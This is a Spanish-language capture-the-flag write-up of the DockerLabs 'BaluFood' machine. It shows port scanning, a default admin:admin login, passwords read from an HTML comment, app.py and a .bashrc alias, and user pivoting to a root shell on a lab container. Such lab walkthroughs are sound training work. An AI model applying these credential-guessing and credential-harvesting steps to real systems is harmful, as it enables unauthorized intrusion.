---
title: BaluFood
description: Página web de un restaurante con data leakage y escalada de privilegios en linux con user pivoting.
date: 2025-04-29
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-balufood/balufood_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - tcp
  - ssh
  - upnp
  - data leaks
  - misconfigurations
  - information gathering
  - web analysis
  - data leak exploitation
  - user pivoting
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/balufood:-$ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.089 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.089/0.089/0.089/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/balufood:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 172.17.0.2 -n -Pn -oG nmap1
Host: 172.17.0.2 ()     Status: Up
Host: 172.17.0.2 ()     Ports: 22/open/tcp//ssh///, 5000/open/tcp//upnp///      Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/balufood:-$ sudo nmap -sCV -p22,5000 -vvv 172.17.0.2 -oN nmap2
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 69:15:7d:34:74:1c:21:8a:cb:2c:a2:8c:42:a4:21:7f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD/+EOmj2PkB3JiPRNvx8CBhMsLP+MZtPK9LPbNWEGIA7AlkNX0go0NBQ5Ad0e7UCOnXW9knwgnOomFJDsLo/1o=
|   256 a7:3a:c9:b2:ac:cf:44:77:a7:9c:ab:89:98:c7:88:3f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL/Vvyg3NC9pIeabLUubEq3XuRQVxIIzh2sSxVeJjM57
5000/tcp open  http    syn-ack ttl 64 Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Restaurante Balulero - Inicio
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```terminal
/home/kali/Documents/dockerlabs/balufood:-$ whatweb 172.17.0.2:5000
http://172.17.0.2:5000 [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Script, Title[Restaurante Balulero - Inicio], Werkzeug[2.2.2]
```

---
## Web Analysis & Data Leak Exploitation

El servicio web inicial presenta una interfaz simple con funcionalidades básicas visibles.

![](assets/img/dockerlabs-writeup-balufood/balufood1_1.png)

```terminal
/home/kali/Documents/dockerlabs/balufood:-$ dirb http://172.17.0.2:5000/
---- Scanning URL: http://172.17.0.2:5000/ ----
+ http://172.17.0.2:5000/admin (CODE:302|SIZE:199)
+ http://172.17.0.2:5000/console (CODE:400|SIZE:167)
+ http://172.17.0.2:5000/login (CODE:200|SIZE:1850)
+ http://172.17.0.2:5000/logout (CODE:302|SIZE:189)
```

Pruebo autenticarme en `/login` con credenciales comunes y el par `admin`:`admin` permite acceder exitosamente al panel `/admin`.

![](assets/img/dockerlabs-writeup-balufood/balufood1_2.png)
![](assets/img/dockerlabs-writeup-balufood/balufood1_3.png)

Analizando el código fuente del panel `/admin`, identifico credenciales comentadas, `sysadmin`:`backup123`.

![](assets/img/dockerlabs-writeup-balufood/balufood1_4.png)

Estas credenciales permiten acceso por ssh como el usuario `sysadmin`.

```terminal
/home/kali/Documents/dockerlabs/balufood:-$ ssh sysadmin@172.17.0.2 
sysadmin@172.17.0.2's password: backup123
```

```terminal
sysadmin@6fa083db4c91:~$ id
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),100(users)
```

---
## User Pivoting

```terminal
sysadmin@6fa083db4c91:~$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
sysadmin:x:1000:1000:sysadmin,sysadmin,,:/home/sysadmin:/bin/bash
balulero:x:1001:1001:balulero,,,:/home/balulero:/bin/bash
```

En el directorio `/home/sysadmin` se encuentra un archivo llamado `app.py`, que contiene una cadena que podría tratarse de una contraseña.

```terminal
sysadmin@6fa083db4c91:~$ head app.py
```

![](assets/img/dockerlabs-writeup-balufood/balufood1_5.png)

La cadena se utiliza como contraseña del usuario `balulero` y permite autenticarse exitosamente.

```terminal
sysadmin@6fa083db4c91:~$ su balulero
Password: cuidaditocuidadin
```
```terminal
balulero@6fa083db4c91:/home$ id
uid=1001(balulero) gid=1001(balulero) groups=1001(balulero),100(users)
```

---
## Privilege Escalation

Dentro del archivo `.bashrc` del usuario `balulero`, aparece definido un alias que permite ejecutar `su - root` utilizando una contraseña.

```terminal
balulero@6fa083db4c91:~$ tail -n1 .bashrc
alias ser-root='echo chocolate2 | su - root'
```

La cadena `chocolate2` corresponde a la contraseña del usuario `root`. De esta forma, la utilizo directamente para obtener una shell privilegiada.

```terminal
balulero@6fa083db4c91:~$ su root
Password: chocolate2

root@6fa083db4c91:/home/balulero# id
uid=0(root) gid=0(root) groups=0(root)
```